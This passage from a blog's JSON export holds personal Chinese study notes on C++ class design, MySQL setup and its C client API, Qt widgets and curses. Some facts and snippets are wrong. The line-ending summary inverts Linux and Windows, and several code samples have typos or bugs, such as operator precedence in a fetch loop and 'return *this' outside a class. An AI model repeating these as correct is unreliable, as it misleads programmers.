&amp;(operator* ()); &#125; ...&#125;; Function-like classes仿函数12345678910111213141516171819202122232425262728293031template &lt;class T&gt;struct identity&#123; const T&amp; operator() (const T&amp; x) const &#123; return x; &#125;&#125;;template &lt;class Pair&gt;struct select1st&#123; const typename Pair::first_type&amp; operator() (const Pair&amp; x) const &#123;return x.first; &#125;&#125;;template &lt;class Pair&gt;struct select2nd&#123; const typename Pair::second_type&amp; operator() (const Pair&amp; x) const &#123; return x.second; &#125;&#125;;template&lt;class T1,class T2&gt;struct pair&#123; T1 first; T2 second; pair() :first(T1()) ,second(T2())&#123;&#125;pair(const T1&amp; a,const T2&amp; b) :first(a), second(b)&#123;&#125;…&#125;;select1st&lt;Pair&gt;() (new Pair());","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"}]},{"title":"再看c++","slug":"2017-03-25-再看c++","date":"2017-03-24T16:00:00.000Z","updated":"2018-02-18T03:29:05.967Z","comments":true,"path":"2017/03/25/2017-03-25-再看c++/","link":"","permalink":"http://coordinate.wang/2017/03/25/2017-03-25-再看c++/","excerpt":"","text":"Object Based基于对象延伸文件名(extension file name )不一定是.h或.cpp，也可以是.hpp或者其他 头文件的声明123456789101112131415#ifndef __COMPLEX__#define __COMPLEX__//forward declarations#include &lt;cmath&gt;class ostream;class complex;complex &amp;__doapl (complex *this, const complex&amp;);//class declarationsclass complex&#123;&#125;;//class definitioncomplex::function#endif 函数若在class内部实现，就会定义成inline候选人，如果他不复杂的话，编译器就会把它做成inline access levelprivate:double re, im;所有的数据都要放在private里面不被外界使用的函数也要放在private里面 constructor123complex(double r = 0, double i =0) //default argument:re(r), im(i) //initialization list, only constructor can use,it’s very nice&#123; &#125; 最好写在inlitialization list 里面，不要写在大括号里。一个是初始化阶段，一个时候后一阶段，效率会很低。构造函数可以有很多个名字与类相同，没有返回类型构造函数放在private，表示这个函数不可以被外界调用，那就无法使用构造了但是有这样一种设计模式Singleton,外界只能用一份 123456789101112131415classs a&#123;public: static a&amp; getInstance(); setup() &#123; &#125;private: a(); a(const a&amp; rhs);&#125;;a&amp; a::getInstance()&#123; static a b; return b;&#125;a::getInstance().setup(); 函数后面加const1double real() const &#123; return re; &#125; //不改变里面的数据内容 在类的设计之初要考虑好这个问题，不然后面调用的时候会出现问题例如：123const complex c1(2,1); 此处想告诉编译器c1是一个不更改内部数据的一个对象 cout &lt;&lt; c1.read();cout &lt;&lt; c1.img(); 但是如果设计之初没有加const的话相当于告诉编译器我这个函数内部可能会修改数据，所以在这里这样使用会出错。 参数的传递1234567pass by valuecomplex(double r = 0, double i =0) :re (r), im (i)&#123; &#125;pass by reference(to const)complex&amp; operator += (const complex&amp;); //内部不可以修改传递的值ostream&amp; operator &lt;&lt; (ostream&amp; os, const complex &amp;x); 这样做的原因在于效率，因为如果参数的大小太大的话，会影响传递速度返回值的传递也尽量用reference friend友元函数可以使用类内部的私有变量1234567friend complex&amp; __doapl (complex*, const complex&amp;);inline complex&amp; __doapl (complex* ths, const complex&amp; r)&#123; ths-&gt;re += r.re; ths-&gt;im += r.im;&#125; 这种做法打破了封装，也可以使用函数取私有变量，虽然这样做速度变慢了。注意这里有这样的做法，在类的内部有这样的函数 12int func(const complex* param)&#123; return param.re + param.im; &#125; 他并没有调用函数取取私有变量，而是直接拿来用，原因是同一个class的各个object互为friends。使用实例： 123complex c1(2,1);complex c2;c2.func(c1); return by reference 1234567inline complex&amp;__doapl (complex* ths, const complex&amp; r)&#123; ths-&gt;re += r.re; ths-&gt;im += r.im; return *this;&#125; 不可以return by reference的情况，在类的内部建立空间，最后要把空间的reference传出去，这样做是错误的，因为，函数一结束，函数的空间就会被操作系统重新分配。传递者无需知道接收者使用什么形式接受，此处用的是reference，这就是c++的优势。 operator overloading成员函数 123inline complex&amp;complex::operator += (const complex&amp; r)&#123; return __doapl (this, r); &#125; 所有成员函数都有this，谁调用函数这个谁就是this，this只一个指针，不能够在参数列写出来。此处返回类型不可为void的原因在于要考虑连续的使用a+=b+=c 非成员函数 123456inline doubleimag(const complex&amp; x)&#123; return x.img (); &#125;inline complexoperator + (const complex&amp; x, const complex&amp; y)&#123; return complex (real (x) +real(y),imag(x)+imag(y)); &#125; 这里没有使用return by reference的原因在于他们返回的必定是local object这里相加的左值是在函数内部创建的这里有一个特殊的地方 1234#include&lt;iostream&gt;ostream&amp;operator &lt;&lt; (ostream&amp; os, const complex&amp; x)&#123; return os &lt;&lt; '(' &lt;&lt; real (x) &lt;&lt; ',' &lt;&lt; imag (x) &lt;&lt; ')' ;&#125; 这个overloading只可以是非成员，原因在于cout不知道怎么去处理自定义数据，他在一开始就写死了。 temp object1typename(); 他的生命周期在返回后就结束了 一些思考关于程序的实现是根据需求而定的首先要考虑用reference可不可以","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"}]},{"title":"MySQL","slug":"2017-03-22-MySQL2","date":"2017-03-21T16:00:00.000Z","updated":"2018-02-18T03:29:05.966Z","comments":true,"path":"2017/03/22/2017-03-22-MySQL2/","link":"","permalink":"http://coordinate.wang/2017/03/22/2017-03-22-MySQL2/","excerpt":"","text":"Sql语句多表查询，不同表之间一定要有一个字段关联表里面的列称为字段field，行成为记录record对于SELECt后面的WHERE字句中用到的字段，原则是必须建相应的索引。索引不要乱箭，精准，不能多。索引可以提高SELECT语句的速度，但代价是降低了INSERT，UPDATE和DELETE语句的速度。 修改数据1UPDATE TABLENAME SET CAL1=VAL1, CAL2=VAL2… WHERE CONDITIONAL Set语句指定要修改的字段和所附的值，where字句指定要修改的行，如果没有where语句，代表修改所有行例子： 1mysql&gt; update table1 set sex = '女' where name = '张三'; 删除语句1DELETE FROM TABLENAME WHERE CONDITIONAL where语句指定要删除的行，如果没有where代表删除所有行例子： 1mysql&gt; delete from table1 where name = '张三'; 注意一点：/usr/include是gcc查找头文件的默认路径。 数据库编程mysql编程首先要做的工作头文件#include &lt;mysql/mysql.h&gt;makefile文件，链接的时候添加-lmysqlclient选项（意思是要链接到libmysqlclient.so这个库文件）数据库client与server之间也是采用TCP协议 连接到mysql步骤初始化client 1Mysql_init(MYSQL *pmysql); 建立连接 1MYSQL *mysql_real_connect(MYSQL *pmysql, const char *hostname,const char *usename,const char *passed, const char *dbname, 0,0,0); 成功返回mysql连接的指针，失败返回NULL通过mysql_error获取错误client向server发送SQL语句，server将执行SQL语句的结果返回给client写网络程序的原则，第一次写的时候，一定要拿本机做实验，“localhost” = “127.0.0.1” 执行sql语句 1int mysql_query(MYSQL *pmysql,const char *sql); 参数pmysql是连接到MySql的指针参数sql是要执行的sql语句成功返回0，失败返回非零注意一点 12345if(mysql_query(connection, \"SET NAMES utf8\") != 0)&#123; printf(\"utf8 error %s\" ,mysql_error(&amp;mysql)); return -1;&#125; 编写mysql程序，成功连接到server之后，以一个执行的语句是设置字符集SET NAMES utf8;linux下printf函数是以\\n结尾的字符串才输出到屏幕的，如果没有\\n直到输出缓冲区满了以后才打印到屏幕 断开连接mysql_close(MYSQL *) 控制台程序，输入退格键不回显的方法命令 12stty erase ^Hsystem(“stty erase ^H”); 可以实现在输入状态下，按退格键删除字符，不回显调用tcsetattr修改linux基本输出输入的控制字符定义//////////////////////////////去掉退格键回显的代码 123456789101112&lt;termios.h&gt;struct termios term;//定义一个temions结构if(tcgetattr(STDIN_FILENO, &amp;term) == -1)//得到系统termion的设置&#123; printf(\"tcgetattr error is %s\\n\", strerror(errno)); return;&#125;term.c_cc[VERASE] = '\\b';//'\\b'为退格键的ASCII码if (tcsetattr(STDIN_FILENO, TCSANOW, &amp;term) == -1)//设置系统termion&#123; printf(\"tcsetattr error is %s\\n\", strerror(errno));&#125; 执行select语句得到查询结果1MYSQL_RES *mysql_store_result(MYSQL *pmysql); 成功返回一个查询结果指针，查询无结果或者错误返回NULL 1mysql_free_result(MYSQL_RES *res) 调用完mysql_store_result，一定要用mysql_free_result释放相关资源 查看查询结果1MYSQL_ROW mysql_fetch_row(MYSQL_ROW *result); 例子： 1234while(row = mysql_fetch_row(result) != NULL)&#123; printf(“name:%s,sex:%s,age:%s,class:%s\\n”,row[0], row[1], row[2], row[3]);&#125; 尽管在表中age是数字，但是mysql返回的只不过是以NULL结尾的字符串 查看查询结果中的字段信息1MYSQL_FIELD *mysql_fetch_field(MYSQL_RES *result); 例子： 1234while((sqlField = mysql_fetch_field(result) != NULL)&#123; printf(“%s\\n”, sqlField-&gt;name);&#125; mysql_fetch_row返回是记录（行）mysql_fetch_field返回是字段（列） 积累关于/usr/bin/ld: cannot find –lmysqlclient错误去/usr/lib文件下去寻找，所以做个软链接即可。 12# cd /usr/lib# ln -s /usr/lib64/mysql /usr/lib 设置环境变量export LIBRARY_PATH=/usr/lib/mysql后，gcc -o mysql mysql.c -lmysqlclient通过 ctrl+s锁屏ctrl+q解锁 \\n 软回车：在Windows 中表示换行且回到下一行的最开始位置。相当于Mac OS 里的 \\r 的效果。在Linux、unix 中只表示换行，但不会回到下一行的开始位置。 \\r 软空格：在Linux、unix 中表示返回到当行的最开始位置。在Mac OS 中表示换行且返回到下一行的最开始位置，相当于Windows 里的 \\n 的效果。 \\t 跳格（移至下一列）。它们在双引号或定界符表示的字符串中有效，在单引号表示的字符串中无效。\\r\\n 一般一起用，用来表示键盘上的回车键，也可只用 \\n。\\t表示键盘上的“TAB”键。就像你使用 enter和shift+enter的区别 文件中的换行符号：linux,unix: \\r\\nwindows : \\nMac OS：\\r","categories":[{"name":"Database","slug":"Database","permalink":"http://coordinate.wang/categories/Database/"}],"tags":[{"name":"sql","slug":"sql","permalink":"http://coordinate.wang/tags/sql/"},{"name":"MySQL","slug":"MySQL","permalink":"http://coordinate.wang/tags/MySQL/"}]},{"title":"MySQL","slug":"2017-03-21-MySQL1","date":"2017-03-20T16:00:00.000Z","updated":"2018-02-18T03:29:05.959Z","comments":true,"path":"2017/03/21/2017-03-21-MySQL1/","link":"","permalink":"http://coordinate.wang/2017/03/21/2017-03-21-MySQL1/","excerpt":"","text":"MySql数据库关于数据库的安装首先centos7 已经不支持mysql，可能redhat也是如此，因为收费了你懂得，所以内部集成了mariadb，而安装mysql的话会和mariadb的文件冲突，所以需要先卸载掉mariadb。1234567891011121314151617181920212223[root@mysql opt]# rpm -qa | grep -i mysql[root@mysql opt]# yum -y remove mysql-*[root@mysql opt]# rpm -qa|grep mariadbmariadb-libs-5.5.44-2.el7.x86_64[root@mysql opt]# rpm -e mariadb-libs-5.5.44-2.el7.x86_64 --nodeps[root@mysql opt]# rpm -ivh mysql-commercial-common-5.7.11-1.1.el6.x86_64.rpm[root@mysql opt]# rpm -ivh mysql-commercial-libs-5.7.11-1.1.el6.x86_64.rpm[root@mysql opt]# rpm -ivh mysql-commercial-libs-compat-5.7.11-1.1.el6.x86_64.rpm[root@mysql opt]# rpm -ivh mysql-commercial-embedded-5.7.11-1.1.el6.x86_64.rpm[root@mysql opt]# rpm -ivh mysql-commercial-devel-5.7.11-1.1.el6.x86_64.rpm[root@mysql opt]# rpm -ivh mysql-commercial-embedded-devel-5.7.11-1.1.el6.x86_64.rpm[root@mysql opt]# rpm -ivh mysql-commercial-client-5.7.11-1.1.el6.x86_64.rpm[root@mysql opt]# rpm -ivh mysql-commercial-server-5.7.11-1.1.el6.x86_64.rpm[root@mysql opt]# yum -y install perl-DBIperl-DBIperl-Compress-Raw-Bzip2perl-Compress-Raw-Zlibperl-Data-Dumperperl-IO-Compressperl-Net-Daemonperl-PlRPC[root@mysql opt]# rpm -ivh mysql-commercial-test-5.7.11-1.1.el6.x86_64.rpm 这样我们就把MySQL5.7.11企业版安装好了，当然最重点的地方也就来了，那就是初始化。 密码在/var/log/mysqld.log这个文件里，你可以用grep ‘temporary password’ /var/log/mysqld.log来查询，也可以自己在文件里找。For example, the cleartext password in the following statement is checked. Under the default password policy, which requires passwords to be at least 8 characters long, the password is weak and the statement produces an error: 1mysql&gt; ALTER USER USER() IDENTIFIED BY &apos;abc&apos;; ERROR 1819 (HY000): Your password does not satisfy the currentpolicy requirements通过 set password=password(‘new_password’); 命令重新设置密码；以上的方法，在MySQL 5.7早期版本时，还是很好用的，但在MySQL 5.7.6以后的版本，最后一点重置密码总是无法生效，会出来下面的错误。ERROR 1819 (HY000): Your password does not satisfy the current policy requirements同时，无法进行其它的操作。这是因为，自MySQL 5.7开始，密码存在有效期的概念， 同时因为安全等级的问题，需要使用使用其它的方式进行设置。另一个需要注意的点是， 自5.7.6开始废弃了password()函数，同时无法设置old_password=1， 这真的是一件比较曲折的探索过程。那么，先把MySQL 5.7.9版本以上的密码设置方法整理一下。大部分和上面整理的内容相同，关键在第4步后，把authentication_string 里写入的值记一下（这是因为password()函数已废弃）通过使用以下命令，代替第7步的， set password=password(‘new_password’) 方法。 1234mysql&gt; ALTER USER 'jeffrey'@'localhost' -&gt; IDENTIFIED WITH mysql_native_password -&gt; AS 'authentication_string字段内容';Query OK, 0 rows affected (0.01 sec) 创建新的数据库12mysql&gt; CREATE DATABASE [IF NOT EXISTS] db_name -&gt; CHARACTER SET charset_name; 例子： 12mysql&gt; CREATE DATABASE db1-&gt; CHARACTER SET utf8; 使用数据库db1 1mysql&gt; USE db1; 删除db1 1mysql&gt; DROP DATABASE db1; 查看系统中已有的数据库 1mysql&gt; show databases; 创建新用户 12mysql&gt; use mysql;mysql&gt; GRANT ALL ON db1.* to dbuser1 IDENTIFIED BY &apos;123&apos;; 出错后这样解决ERROR 1290 (HY000): The MySQL server is running with the –skip-grant-tables option so it cannot execute this statementmysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec) 1mysql&gt; GRANT ALL ON db1.* to dbuser1 IDENTIFIED BY &apos;123&apos;; //*表示这个用户对于这个数据库的一切对象都有权限 Query OK, 0 rows affected, 1 warning (0.00 sec) 登陆dbuser1后 1# mysql -u dbuser1 –p 设置字符集 1mysql&gt; SET NAMES utf8; 字符集一定要统一字符集一定要统一字符集一定要统一字符集 首先操作系统的字符集为utf8查看操作系统字符集命令locale 创建数据库的时候使用CHARACTER SET utf8;指定字符集为utf8 设置mysql client字符集SET NAMES utf8; CRT设置为utf8要注意的是注意大小写问题 Sql语言创建表语句1CREATE TABLE TABLENAME (COL_NAME1 TYPE, COL_NAME2 TYPE……); 常用type说明INT 整数CHAR(LENGTH) 定长字符串，短语指定长度用空格填充VARCHAR(LENGTH) 可变长字符串 删除表语句1DROP TABLE TABLENAME; 例子： 1234567891011mysql&gt; use db1;Database changedmysql&gt; CREATE TABLE table1 (name varchar(100), sex varchar(10), age int, class varchar(100));mysql&gt; show tables;+---------------+| Tables_in_db1 |+---------------+| table1 |+---------------+创建带id号的表mysql&gt; CREATE TABLE table2 (ID int(11) NOT NULL auto_increment, name varchar(100), age int, PRIMARY KEY(ID)); 查看表的结构1mysql&gt; desc table1; 插入数据语句1mysql&gt; INSERT INTO TABLENAME (COL1, COL2,…) VALUES(VAL1, VAL2…); 向表插入一行数据，前面指定列名，后面插入的值注意在sql语句中字符串用单引号带ID的表，ID自动，不需要管 1mysql&gt; INSERT INTO table2 (name, age) VALUES (&apos;里斯&apos;, 20); SELECT语句12SELECT * FROM table1;SELECT name, age FROM table1; 返回指定行数的SELECT查询数据语句LIMIT字句的语法1SELECT * FROM TABLENAME LIMIT m,n 其中m是指记录开始的index,从0开始，表示第一条记录N是指从第m+1条开始，取n条例子： 12SELECT * FROM table1 LIMIT 0,5SELECT * FROM table1 LIMIT 6,3 带有条件的查询语句 1SELECT COL1,COL2,… FROM TABLENAME WHERE CONDITIONAL; WHERE后面是条件语句条件语句可以做逻辑判断组合LIKE 通过%通配符匹配指定模式IN 包含子集&lt;&gt; 不等于例子： 1234mysql&gt; SELECT * FROM table1 WHERE age &gt;= 20;mysql&gt; SELECT * FROM table1 WHERE age &gt;= 20 AND class = &apos;高数&apos;;mysql&gt; SELECT * FROM table1 WHERE class LIKE &apos;高%&apos;; mysql&gt; SELECT * FROM table1 WHERE age IN (20, 30); 别名列别名 1SELECT FIELDNAME ALIAS FROM TABLENAME; 表别名 1SELECT ALIAS.FIELDNAME FROM TABLENAME ALIAS; 例子： 1mysql&gt; SELECT name 姓名 FROM table2; 聚合函数SUM([DISTINCT] FIELDNAME)求指定列之和MAX([DISTINCT] FIELDNAME)求指定列最大值MIN([DISTINCT] FIELDNAME)求指定列最小值COUNT([DISTINCT] FIELDNAME)求指定列记录总数AVG([DISTINCT] FIELDNAME)求指定列平均值distinct 过滤重复的值例子： 12345mysql&gt; SELECT SUM(age) FROM table2;mysql&gt; SELECT name FROM table2 WHERE age = (SELECT MAX(age) FROM table2);mysql&gt; SELECT SUM(DISTINCT age) FROM table2;mysql&gt; SELECT COUNT(DISTINCT age) FROM table2;mysql&gt; SELECT COUNT(name) FROM table2 WHERE name LIKE &apos;里%&apos;; GROUP BY子句将查询的结果根据指定字段分组；GROUP BY fieldname [DESC]往往和聚合函数配合使用ORDER BY子句将查询结果根据指定字段排序ORDER BY fieldname [DESC]例子： 12mysql&gt; SELECT COUNT(name) FROM table2 GROUP BY name;mysql&gt; SELECT MAX(age) FROM table2 GROUP BY name; 每个组单独用这个聚合函数 12mysql&gt; SELECT * FROM table2 ORDER BY age;mysql&gt; SELECT * FROM table2 ORDER BY age DESC;反过来 SELECT 语句，查询多个表的WHERE语句12SELECT * FROM table1, table2 WHERE table1.AGE = table2.AGE;SELECT * FROM table1, table2 WHERE (table1.NAME = table2.NAME) AND table1.AGE = 20; CREATE INDEX语句用于在表中创建索引在不读取整个表的情况下，索引可以是数据库应用程序更快地查找数据。CREATE INDEX语法在表上创建一个简单的索引。允许使用重复的值CREATE INDEX index_nameON table_name (column_name)CREATE UNIQUE INDEX语法在表上创建一个唯一的索引。不允许使用重复的值CREATE UNIQUE INDEX index_nameON table_name (column_name)例子： 1mysql&gt; CREATE INDEX table1_age ON table1 (age); 建立表的时候PRIMARY KEY (ID))语句相当于为ID字段建立了一个唯一索引 积累tar xvf 解压缩包tar cvf 打包命令查看操作系统字符集命令locale deb 是 ubuntu 、debian 的格式。 rpm 是 redhat 、fedora 、suse 的格式。他们不通用（虽然可以转换一下）。deb是debian发行版的软件包 ubuntu是基于debian 发行的 所有可以用.deb是solaris系统下的安装包后缀名。安装方法如下cd 到安装包的目录dpkg -i 安装包名字如果你使用的是red hat linux，然后运行以下命令安装cd 到安装包的目录 rpm -ivh 安装包名字 查看安装的文件rpm -qa | grep 文件 卸载rpm -e 文件强制卸载rpm -e –nodeps 文件","categories":[{"name":"Database","slug":"Database","permalink":"http://coordinate.wang/categories/Database/"}],"tags":[{"name":"sql","slug":"sql","permalink":"http://coordinate.wang/tags/sql/"},{"name":"MySQL","slug":"MySQL","permalink":"http://coordinate.wang/tags/MySQL/"}]},{"title":"QT","slug":"2017-03-19-QT2","date":"2017-03-18T16:00:00.000Z","updated":"2018-02-18T03:29:05.951Z","comments":true,"path":"2017/03/19/2017-03-19-QT2/","link":"","permalink":"http://coordinate.wang/2017/03/19/2017-03-19-QT2/","excerpt":"","text":"Qt布局通常，子Widget时通常使用布局对象在窗口中进行排列的，而不是通过指定位置和大小进行排列的。在此，构造一个并列的标签和行编辑框Widget123456QLabel *label = new QLabel(tr(“Name:”));QLineEdit *lineEdit = new QLineEdit();QHBoxLayout *layout = new QHBxLayout();layout-&gt;addWidget(label);layout-&gt;addWidget(lineEdit);window-&gt;setLayout(layout); 由于Widget可包含其他Widget，所以布局可用来提供按不同层次分组的Widget。这里，要在显示查询结果的表视图上方、窗口顶部的行编辑框旁，显示一个标签 12345678910QLabel *queryLabel = new QLabel(tr(“Query:”));QLineEdit *queryEdit = new QLineEdit();QTableView *resultView = new QTableView();QHBoxLayout *queryLayout = new QHBoxLayout();queryLayout-&gt;addWidget(queryLabel);queryLayout-&gt;addWidget(queryEdit);QVBoxLayout *mainLayout = new QVBoxLayout();mainLayout-&gt;addLayout(queryLayout);mainLayout-&gt;addWidget(resultView);window-&gt;setLayout(mainLayout); QGridLayout控件对齐1layout-&gt;addWiget(label, 0, 0); 注意在后面加上两个参数，标识位置 addWidget()方法用于向布局中加入需要的控件 12345678void addWidget&#123; QWidget widget; int fromRow, int fromColumn, int rowSpan, //占用的行数 int columnSpan, //占用的列数 Qt::Alignment alignment=0 //对齐方式&#125; addLayout()方法用于向布局中加入需要布局的字布局，addLayout()的函数 12345678void addLayout&#123; QLayout *layout, int row, int column, int rowSpan, int columnSpan, Qt::Alignment alignment=0&#125; label设置图像123QPixmap icon(“1.png”);label-&gt;setPixmap(icon);label-&gt;resize(icon.width(), icon.height()); layout设置控件的间距 1layout-&gt;serSpacing(20); layout设置站位比 1layout-&gt;setColumnStretch(0,1); //设置每列的站位比 layout设置边距 1layout-&gt;setMargin(10); layout大小与控件最合适 1layout-&gt;setSizeConstraint(QLayout::SetFixedSize); QTimer\\QTimeQTimer是定时器，QTime是显示系统时间的，用法： 12345678910111213141516// QTimerQTimer *timer = new QTimer();connect(timer, SIGNAL(timeout()), this, SLOT(sltTimeOut()));&#123; QTimer *myTimer; myTimer=new QTimer(this); myTimer-&gt;start(1000); connect(myTimer,SIGNAL(timeout()),this,SLOT(getDateTime())); &#125; // QTimeqDebug() &lt;&lt; QTime::currentTime().toString(\"hh:mm:ss\");void MainWindow::getDateTime() &#123; ui-&gt;label_time-&gt;setText(QTime::currentTime().toString()); ui-&gt;label_date-&gt;setText(QDate::currentDate().toString(tr(\"yyyy-MM-dd dddd\"))); &#125; Qt对话框标准文件对话框1234567QString QFileDialog::getOpenFileName( QWidget *parent = 0; //标准文件对话框的父窗口 const QString &amp;caption=QString(); //标准文件对话框的标题 const QString &amp;dir=QString(); //指定目录 QString *selectedFilter = 0; //文件过滤器 Options options = 0; //显示文件名的格式) 返回文件路径和文件名 12if(s.isEmpty()) setWindowTitle(s); //判断是否点击确认按钮 标准颜色对话框getColor()函数时标准颜色对话框QColorDialog类的一个静态函数，数返回用户选择的颜色值，下面是getColor()函数形式: 1234QColor getColor( const QColor&amp; initial = Qt::white, QWidget *parent = 0 //父窗口); 标准字体对话框getFont()函数是标准字体对话框QFontDialog类的一个静态函数，该函数返回用户所选择的字体 1234QFont getFont( bool *ok, QWidget *parent = 0) QMessageBox类question()函数1234567StandardButton QMessageBox::question( QWidget *parent, const QString &amp;title, //消息框标题 const QString &amp;text, //消息框的文字提示信息 StandardButtons buttons = Ok, //按钮 StandardButton defaultButton = No //默认按钮); information()函数,用于提示 1234567StandardButton QMessageBox::information( QWidget *parent, const QString &amp;title, const QString &amp;text, StandardButtons buttons = Ok, StandardButton defaultButton = NoButton); warning()函数warning消息框使用QMessage Box::warning()函数完成， 1234567StandardButton QMessageBox::warning( Qwidget *parent, const QString &amp;title, const QString &amp;text, StandardButtons buttons = Ok, StandardButton defaultButton = NoButton) critical()函数about()函数 toolbox类实现抽屉效果 文件读写QT提供了QFile文件QFile可以都写文本文件，也可以读写二进制文件 12345678910111213&lt;QFile&gt;&lt;QTextStream&gt;QString s;QFile file(“a.txt”);If(file.open(QFile::ReadOnly))&#123; QTextSream stream(&amp;file); while(!stream.atEnd()) &#123; s = stream.readLine(); &#125; file.close();&#125; 写文件例子 1234567QFile file(“a.txt”)if(file.open(QFile::WriteOnly | QFile::Truncate))&#123; QTextStream out(&amp;file); out &lt;&lt; tr(“hello world\\n”); //out &lt;&lt; text-&gt;toPlainText(); file.close();&#125; QMainWindow 是一个为用户提供的主窗口程序的类，包含菜单栏、及一个中心部件，是许多应用程序的基础。QMainWindow中菜单需要QMenu和QAction类来实现QAction类中定义了菜单的具体行为QMainWindow中提供了menuBar函数返回一个menuBar通过调用menuBar的addMenu函数就可以生成一个新的菜单项QMenu类addAction函数为菜单制定一个QActionQMainWindow中提供了自己的布局控件，所以不需要再为QMainWindow定义布局控件 1234567open = new QAction(tr(\"open\"), this);open-&gt;setShortcut(tr(\"Ctrl+O\"));connect(open, SIGNAL(triggered()), this, SLOT(openfile()));menu = menuBar()-&gt;addMenu(tr(\"file\"));menu-&gt;addAction(open);edit = new QTextEdit();setCentralWidget(edit); 网络编程qt如果需要进行网络编程首先需要在.pro文件中添加QT += network在头文件中添加 12&lt;QHostInfo&gt; &lt;QNetworkInterface&gt; QHostInfor类用于获取主机信息 1234567891011QString localHostName = QHostInfo::localHostName();QHostInfo hostInfo = QHostInfo::fromName(localHostName);QList&lt;QHostAddress&gt; list = hostInfo.addresses();if(!list.isEmpty())&#123; QList&lt;QHostAddress&gt;::iterator i; for(i = list.begin(); i != list.end(); ++i) &#123; QMessageBox::information(this, tr(“hint”), (*i).toString()); &#125;&#125; QNetworkInterface类获取与网口相关的信息","categories":[{"name":"QT","slug":"QT","permalink":"http://coordinate.wang/categories/QT/"}],"tags":[{"name":"network","slug":"network","permalink":"http://coordinate.wang/tags/network/"},{"name":"QT","slug":"QT","permalink":"http://coordinate.wang/tags/QT/"},{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"}]},{"title":"QT","slug":"2017-03-17-QT1","date":"2017-03-16T16:00:00.000Z","updated":"2018-02-18T03:29:05.946Z","comments":true,"path":"2017/03/17/2017-03-17-QT1/","link":"","permalink":"http://coordinate.wang/2017/03/17/2017-03-17-QT1/","excerpt":"","text":"QtQt图形界面界面设计，双击dialog.ui进入 属性窗口 右点击控件Go to slot，点击clicked 头文件中增加12private slots: void on_pushButton_clicked(); cpp文件中增加 1234567void Widget::on_pushButton_clicked()&#123; QString s1 = ui-&gt;lineEdit-&gt;text(); QString s2 = ui-&gt;lineEdit_2-&gt;text(); int a = s1.toInt() + s2.toInt(); ui-&gt;label-&gt;setText(QString::number(a));&#125; 再把文件打包给别人使用时，要删除文件夹内的pro文件 qt代码实现界面头文件12345#include &lt;QDialog&gt;#include &lt;QPushButton&gt;#include &lt;QLineEdit&gt;#include &lt;QLabel&gt;#include &lt;QGridLayout&gt; Cpp文件 12345678910111213btn1 = new QPushButton(this);edit1 = new QLineEdit(this);edit2 = new QLineEdit(this);label1 = new QLabel(this);btn1-&gt;setText(\"sum\");QGridLayout *layout = new QGridLayout(this);// QGridLayout *layout = new QGridLayout();//this-&gt;setLayout(layout);layout-&gt;addWidget(edit1, 0, 0);layout-&gt;addWidget(edit2, 0, 1);layout-&gt;addWidget(btn1, 1, 0);layout-&gt;addWidget(label1, 1, 1);connect(btn1, SIGNAL(clicked()), this, SLOT(add())); 在qt中使用相关的容器控件不需要delete要注意的是如果控件变量没有附加到widget如btn1 = new QPushButton();并且没有写layout-&gt;addWidget(btn1, 0, 0);那就要写delete 控件的事件响应函数头文件 12private slots:void add(); cpp文件 123456connect(btn1, SIGNAL(clicked()), this, SLOT(add()));QString().isNULL(); //trueQString().isEmpty(); //trueQString(“”).isNULL(); //falseQString(“”).isEmpty(); //true 一个NULL字符串一定是一个空字符串，但一个空字符串不一定是一个NULL字符串null表示未指向任何对象而””，表示一个没有内容的字符串 QDateTime类1&lt;QDateTime&gt; 可以使用这个类获取系统时间。通过QDateTime::currentDateTime()来获取本地系统的时间和日期信号。可以通过date()和time()来返回datetime中的日期和时间 12QDateTime *dateTime = new QDateTime(QDateTime::currentDateTime());QString s = dataTime-&gt;date().toString(); QTimer类新建定时器 1QTimer *time_clock = new QTimer(this); 链接这个定时期的信号和槽，利用定时器的timeout() 12connect(time_clock, SIGNAL(timeout()), this, SLOT(slottimedone()));time_clock-&gt;start(2000); 开启定时器，并设置定时周期定时器定时有两种，start(int time)和setSingleShot(true)。其中第一个函数表示每隔”time”秒就会重启定时器，利用stop()将定时器关掉，而后者表示近启动一次。前者比较常用。 创建窗口如果Widget未使用父级进行创建，则在显示视为窗口或顶层Wiget。由于顶层Widget没有父级对象类来确保对其不再使用时就删除，所以需要开发人员在应用程序中对其进行追踪。在本例中，使用QWiget创建和显示具有默认大小的窗口 123456QWidget *window = new QWidget(); //注意一个问题，此时是在堆里面的window-&gt;resize(320, 240);window-&gt;show();QPushButton *button = new QPushButton(tr(“press me”), window);button-&gt;move(100, 100);button-&gt;show(); 针对于上面的问题下面的方式，是在栈里面，所以效果是一闪而过 123QWidget window;window.resize(320, 240)window.show(); widget适合非模式的对话框，dialog适合模式的对话框 字符图形界面-lcurses 编译时要加这个库文件123456789101112131415161718192021222324int main()&#123; initscr(); //begin graphic model neocho(); //not echo chartemp[128]; chars[128]; intseq = 0; while(scanf(\"%s\",s))&#123; if(stramp(s,\"exit\") == 0)&#123; break; &#125; clear(); //cls sprintf(temp,\"please input:\\n\"); mvaddstr(0,0, temp); //print at the specifiedcoordinate inti = 0; for(;i &lt; 10; ++i)&#123; sprintf(temp,\"%s %d %s \",s seq++,s); mvaddr(i+ 1, 0, temp); &#125; movd(0,13); //move cursor to the specifiedcoordinate refresh(); //refresh &#125; endwin(); return0;&#125; 积累12345iconv --list //查看字符编码&lt;iconv.h&gt;iconv_t iconv_open(const char *tocode,const char *fromcode); //linux转化字符集size_t iconv(iconv_t cd, char **inbuf,size_t *inbytesleft, char **outbuf, size_t *outbytesleft); iconv_close() 最后要调用close函数第一步iconv_open(目标字符集，源字符集)第二步iconv()实现字符集转化第三部iconv_close()关闭iconv 建立文件链接ln libGL.so.1 libGL.so 12345678class abc&#123; public: const char*getp()&#123; //注意要返回const，以防别人外部修改私有变量 return p; &#125; private: char *p;&#125; 如果将const char 强转为char ，c++会复制一个空间出来如char s = (char )p;p是一个const char 